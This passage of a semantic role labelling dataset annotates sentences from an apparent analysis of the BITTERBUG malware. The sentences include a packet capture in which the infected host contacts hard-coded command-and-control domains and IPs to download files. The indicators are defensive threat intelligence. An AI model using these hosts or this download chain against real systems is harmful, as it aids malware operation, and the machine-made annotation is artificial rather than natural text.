{"text": "BITTERBUG"}, "ARGM-TMP": {"text": "then"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "attempt", "index": 3}, "ARG1": {"text": "to download the files listed in Table 1"}}, "download": {"ARG0": {"text": "BITTERBUG"}, "V": {"text": "download", "index": 5}, "ARG1": {"text": "the files listed in Table"}, "ARGM-EXT": {"text": "1"}}, "listed": {"ARG1": {"text": "the files"}, "V": {"text": "listed", "index": 8}, "ARG2": {"text": "in Table"}, "ARGM-EXT": {"text": "1"}}}, " The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this\ncommand occurring in the wild": {"might": {"V": {"text": "might", "index": 5}}, "be": {"ARG1": {"text": "The purpose of this command"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "be", "index": 6}, "ARG2": {"text": "to delete older versions of BITTERBUG"}, "ARGM-ADV": {"text": "although we have not observed this command occurring in the wild"}}, "delete": {"V": {"text": "delete", "index": 8}, "ARG1": {"text": "older versions"}}, "have": {"V": {"text": "have", "index": 16}}, "observed": {"ARG0": {"text": "we"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "observed", "index": 18}, "ARG1": {"text": "this command occurring in the wild"}}, "occurring": {"ARG1": {"text": "this command"}, "V": {"text": "occurring", "index": 21}, "ARGM-LOC": {"text": "in the wild"}}}, "   Time           Source               Destination         Protocol Length Info\n\n 38   44.290689000   192.168.202.131      192.168.202.2       DNS   77 Standard query 0x6ad3 A winter.site11.com\n 41   44.292830000   192.168.202.2        192.168.202.131     DNS   93 Standard query response 0x6ad3 A 31.170.161.136\n 45   44.518185000   192.168.202.131      31.170.161.136      HTTP 219 GET /D/pub.txt HTTP/1.1\n 47   44.743999000   31.170.161.136       192.168.202.131     HTTP 474 HTTP/1.1 302 Found (text/html)\n \u2193\n 84   45.990199000   192.168.202.131      31.170.161.136      HTTP     233    GET /D/1/f42cce984070b8ab1c0 HTTP/1.1\n 86   46.216079000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)\n 94   46.525887000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1\n101   46.939359000   192.168.202.131      192.168.202.2       DNS       82    Standard query 0x5ae5 A swim.onlinewebshop.net\n102   46.940914000   192.168.202.2        192.168.202.131     DNS       98    Standard query response 0x5ae5 A 83.125.22.197\n107   47.287205000   192.168.202.131      83.125.22.197       HTTP     224    GET /D/pub.txt HTTP/1.1\n109   48.219805000   83.125.22.197        192.168.202.131     HTTP     330    HTTP/1.1 200 OK (text/html)\n \u2193\n118   48.813394000   192.168.202.131      192.168.202.2       DNS   82 Standard query 0x5362 A july.mypressonline.com\n119   48.814837000   192.168.202.2        192.168.202.131     DNS   98 Standard query response 0x5362 A 83.125.22.197\n123   49.131675000   192.168.202.131      83.125.22.197       HTTP 224 GET /D/pub.txt HTTP/1.1\n125   49.780323000   83.125.22.197        192.168.202.131     HTTP 330 HTTP/1.1 200 OK (text/html)\n \u2193\n137   50.536285000   192.168.202.131      31.170.161.136      HTTP     220    GET /D/77568289 HTTP/1.1\n139   50.762073000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)\n147   51.101706000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1\n154   51.548661000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1\n163   52.014730000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1\n165   52.637958000   83.125.22.197        192.168.202.131     HTTP     679    HTTP/1.1 200 OK (text/html)\n</table>   \u2193\n<heading>Received command</heading>\nThe domain names of the C&C servers it relies on are hard-coded in the body of the malware": {"relies": {"ARG0": {"text": "it"}, "V": {"text": "relies", "index": 8}, "ARG1": {"text": "on"}}, "are": {"ARG1": {"text": "The domain names of the C&C servers it"}, "V": {"text": "are", "index": 10}, "ARG2": {"text": "hard - coded in the body of the malware"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 13}, "ARGM-LOC": {"text": "in the body of the malware"}}}}